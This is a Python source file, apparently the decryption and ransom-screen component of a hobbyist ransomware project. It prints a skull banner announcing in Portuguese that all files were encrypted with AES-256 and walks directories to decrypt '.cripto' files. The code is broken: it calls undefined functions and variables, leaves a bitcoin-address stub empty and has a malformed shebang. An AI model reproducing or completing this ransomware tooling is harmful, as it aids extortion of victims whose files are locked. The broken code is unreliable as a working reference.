#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
import os, socket

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

skull = '''
   .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .

        \33[93mTODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS COM AES-256
'''



def bitcoin_addr():
    pass

def decrypt_all():
    SRSA_to_RSA()
    print('[*] chave privada do cliente descriptografada')
    RSA_to_AES()
    print('[*] chave AES descriptografada')

    f = open(caminho_correto + 'AES.txt','r')
    a = f.read()
    tam = len(a)
    if(tam == 30):
        decrypt()

def decrypt(diretorio):
    for caminho, diretorio, arquivo in os.walk(diretorio):
        for arq in arquivo:
            a = caminho+'/'+arq
            extensao = os.path.splitext(a)
            if(extensao[1] == '.cripto'):
                a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                descriptografa(chave_AES,a)


if __name__ == '__main__':
    os.system('clear')
    print('{0}'+skull+'{1}').format(RED,GREEN)
    decrypt_all()
